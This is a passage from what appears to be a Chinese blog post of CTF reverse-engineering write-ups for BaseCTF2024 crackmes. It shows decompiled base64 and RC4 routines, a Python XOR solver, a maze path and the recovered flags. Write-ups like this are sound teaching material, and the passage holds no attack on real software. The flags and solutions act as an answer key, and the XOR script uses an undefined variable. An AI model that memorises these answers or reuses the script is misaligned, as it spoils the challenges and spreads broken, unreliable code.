title="15.舔狗四部曲—记忆的时光机"></a>15.舔狗四部曲—记忆的时光机</h2><h5 id="linux动态调试-看汇编（qwq"><a href="#linux动态调试-看汇编（qwq" class="headerlink" title="linux动态调试  看汇编（qwq"></a>linux动态调试  看汇编（qwq</h5><h2 id="16-舔狗四部曲—简爱"><a href="#16-舔狗四部曲—简爱" class="headerlink" title="16.舔狗四部曲—简爱"></a>16.舔狗四部曲—简爱</h2><h5 id="o编译-链接。妈的"><a href="#o编译-链接。妈的" class="headerlink" title=".o编译 ? 链接。妈的"></a>.o编译 ? 链接。妈的</h5><h2 id="17-舔狗四部曲—相逢已是上上签"><a href="#17-舔狗四部曲—相逢已是上上签" class="headerlink" title="17.舔狗四部曲—相逢已是上上签"></a>17.舔狗四部曲—相逢已是上上签</h2><h5 id="修复损坏的DOS文件-魔改key的xxtea"><a href="#修复损坏的DOS文件-魔改key的xxtea" class="headerlink" title="修复损坏的DOS文件  魔改key的xxtea"></a>修复损坏的DOS文件  魔改key的xxtea</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240501003325519.png" alt="image-20240501003325519"></p><h2 id="18-舔狗四部曲—我的白月光"><a href="#18-舔狗四部曲—我的白月光" class="headerlink" title="18.舔狗四部曲—我的白月光"></a>18.舔狗四部曲—我的白月光</h2><h5 id="什么病毒？"><a href="#什么病毒？" class="headerlink" title="什么病毒？"></a>什么病毒？</h5><h2 id="19-ez-enc"><a href="#19-ez-enc" class="headerlink" title="19.ez_enc"></a>19.ez_enc</h2><p>z3</p><h2 id="20-easy-lauguage"><a href="#20-easy-lauguage" class="headerlink" title="20.easy lauguage"></a>20.easy lauguage</h2><p>base64+AES</p><p>没换表</p><h2 id="21-钩子"><a href="#21-钩子" class="headerlink" title="21.钩子"></a>21.钩子</h2><h5 id="反调试-hook-rc4"><a href="#反调试-hook-rc4" class="headerlink" title="反调试 hook rc4"></a>反调试 hook rc4</h5><h2 id="22-44-BaseCTF2024（22道）"><a href="#22-44-BaseCTF2024（22道）" class="headerlink" title="22-44.BaseCTF2024（22道）"></a>22-44.BaseCTF2024（22道）</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><p>Part1</p><p>打开IDA按F5，得到第一部分</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135041482.png" alt="image-20240824135041482"></p><p>Part2</p><p>根据以上提示，shift+F2:</p><p>Second字符点击进入，按“X”交叉引入找到对应函数，</p><p>得到第二部分flag，按“R”转换为字符：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135517153.png" alt="image-20240824135517153"></p><p>Part3</p><p>第三部分flag在一个Interesting的函数中：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135453999.png" alt="image-20240824135453999"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135535863.png" alt="image-20240824135535863"></p><p>flag:</p><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>拖DIE中查壳儿，4.01版本</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824140522684.png" alt="image-20240824140522684"></p><p><code>upx -d  UPXmini.exe</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824143602786.png" alt="image-20240824143602786"></p><p>点击base64函数，发现没换表，有密文，直接出flag</p><p>附一个标准base64：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">base64_encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *Str; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v1 = v6 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">2</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v11 + <span class="number">1</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; v6 - v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v9] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v9 + <span class="number">1</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v8]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v9 + <span class="number">2</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * Str[v8 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v9 + <span class="number">3</span>] = v4[Str[v8 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8 += <span class="number">3</span>;</span><br><span class="line">    v9 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[(<span class="number">16</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v2 = &amp;v5[v11 - <span class="number">1</span>];</span><br><span class="line">    *v2 = <span class="number">61</span>;</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = *v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v10 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">2</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v6 - <span class="number">2</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = v4[(<span class="number">4</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v11 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v11] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><p>无壳</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144240382.png" alt="image-20240824144240382"></p><p>看逻辑，判断输入字符为28位，处理v4(假设为密钥”Xor”)，加密输入字符，与密文比较——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240824144219198.png" alt="image-20240824144219198"></p><p>Set item type 改数据类型</p><p>异或串1由i异或key循环产生28位</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824154936713.png" alt="image-20240824154936713"></p><p>flag与 逆转的异或串1 异或产生字符串Str</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824193746260.png" alt="image-20240824193746260"></p><p>最后Str与给的密文比较</p><p>逻辑也简单，写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x58</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>] <span class="comment">#Xor转16进制</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">box = []</span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">Str = [</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0x1D</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x7A</span>, <span class="number">0x31</span>, <span class="number">0x20</span>, <span class="number">0x1E</span>, <span class="number">0x49</span>, <span class="number">0x3D</span>, <span class="number">0x67</span>, </span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x05</span>, <span class="number">0x34</span>, </span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x40</span>, <span class="number">0x3b</span>, <span class="number">0x25</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">   flag +=<span class="built_in">chr</span>(i ^ enflag[<span class="number">27</span>-i] ^ key[i%<span class="number">3</span>] )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># BaseCTF&#123;X0R_I5_345Y_F0r_y0U&#125; </span></span><br></pre></td></tr></table></figure><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200108696.png" alt="image-20240824200108696"></p><p>wa！迷宫！</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200625193.png" alt="image-20240824200625193"></p><p>出来啦！<code>sssssssddddwwwddsssssssdddsssddddd</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200720082.png" alt="image-20240824200720082"></p><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>看题目，看main函数：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200822549.png" alt="image-20240824200822549"></p><p>encode：看着像base64，但是Plus！细细看，不只是换了表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+9h] [rbp-3Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// [rsp+Bh] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+Ch] [rbp-3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v17;</span><br><span class="line">    v5 = <span class="number">4</span>i64;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v7 + <span class="number">1</span>;</span><br><span class="line">        v11 = <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v10;</span><br><span class="line">          *(&amp;v14 + v11) = a1[v10 - <span class="number">1</span>];</span><br><span class="line">          v12 = (<span class="type">int</span>)v11 &lt;= <span class="number">2</span>;</span><br><span class="line">          v13 = v3 &gt; (<span class="type">int</span>)v10++;</span><br><span class="line">          ++v11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &amp;&amp; v12 );</span><br><span class="line">      &#125;</span><br><span class="line">      v17[<span class="number">0</span>] = Secret[(<span class="type">unsigned</span> __int8)v15 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v17[<span class="number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (_BYTE)v15) &amp; <span class="number">0x30</span>];</span><br><span class="line">      v17[<span class="number">2</span>] = Secret[(v16 &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * HIBYTE(v15)) &amp; <span class="number">0x3C</span>];</span><br><span class="line">      v17[<span class="number">3</span>] = Secret[v16 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="number">0xE</span>;</span><br><span class="line">        ++v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 != v5 );</span><br><span class="line">      LODWORD(result) = v5;</span><br><span class="line">      v6 += <span class="number">4</span>i64;</span><br><span class="line">      v4 -= <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">4</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">int</span>)result;</span><br><span class="line">  *(_BYTE *)(a2 + (<span class="type">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201050815.png" alt="image-20240824201050815"></p><p>果然结果异或0xE</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201316243.png" alt="image-20240824201316243"></p><h3 id="1z-RC4"><a href="#1z-RC4" class="headerlink" title="1z_RC4"></a>1z_RC4</h3><p>F5没有什么东西，往下翻，看到.t3xt，应该是子修改代码：</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241008162135839.png" alt="image-20241008162135839"></p><p>之后是标准的base64编码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400131C0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v10; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+E8h] [rbp+C8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+1B4h] [rbp+194h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+1B4h] [rbp+194h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+1B4h] [rbp+194h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+1B4h] [rbp+194h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+1B4h] [rbp+194h]</span></span><br><span class="line"></span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  v12 = (<span class="number">3</span> - a2 % <span class="number">3</span>) % <span class="number">3</span>;</span><br><span class="line">  v4 = <span class="number">0</span>i64;</span><br><span class="line">  v5 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = *(_BYTE *)(v4 + a1);</span><br><span class="line">    ++v4;</span><br><span class="line">    v9 = v13;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = *(_BYTE *)(v4 + a1);</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = *(_BYTE *)(v4 + a1);</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v15 | (v10 &lt;&lt; <span class="number">8</span>) | (v9 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    *(_BYTE *)(v5 + a3) = aAbcdefghijklmn[(v11 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a3) = aAbcdefghijklmn[(v11 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v7 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 &lt;= <span class="number">1</span> )</span><br><span class="line">      v16 = aAbcdefghijklmn[(v11 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v7 + a3) = v16;</span><br><span class="line">    v8 = v7 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      v17 = <span class="number">61</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v17 = aAbcdefghijklmn[v11 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    *(_BYTE *)(v8 + a3) = v17;</span><br><span class="line">    v5 = v8 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v5 + a3;</span><br><span class="line">  *(_BYTE *)(v5 + a3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/没改过</span><br></pre></td></tr></table></figure><p>往下是初始化init函数，：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140013530</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">276</span>]; <span class="comment">// [rsp+70h] [rbp+50h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+184h] [rbp+164h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0x62</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span 